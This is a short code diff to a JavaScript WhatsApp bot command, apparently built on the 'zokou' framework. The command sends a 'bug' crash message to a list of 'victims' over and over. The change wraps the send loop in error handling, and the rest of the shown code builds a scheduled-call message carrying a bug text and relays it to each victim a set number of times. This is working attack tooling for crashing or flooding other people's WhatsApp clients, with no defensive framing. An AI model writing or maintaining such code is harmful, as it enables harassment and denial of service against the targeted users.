@@ -247,6 +247,7 @@ zokou(
     for (let i = 0; i < victims.length; i++){
       const victim = victims[i]+'@s.whatsapp.net';
       for (let j = 0; j < amount; j++){
+        try {
         const bug = `${bugtext1}`;
         var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
           "scheduledCallCreationMessage":{
@@ -256,6 +257,11 @@ zokou(
           }
         }), {userJid: dest, quoted: ms});
         zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+        } catch (e) {
+          await repondre(`error sending bugs to ${victim}`)
+          console.error(`Error sending bug to ${victim}: ${e}`)
+          break;
+        }
         await delay(3000);
       }
       await repondre(`*Successfully sent as many Bugs as ${amount} To ${victim}*`);
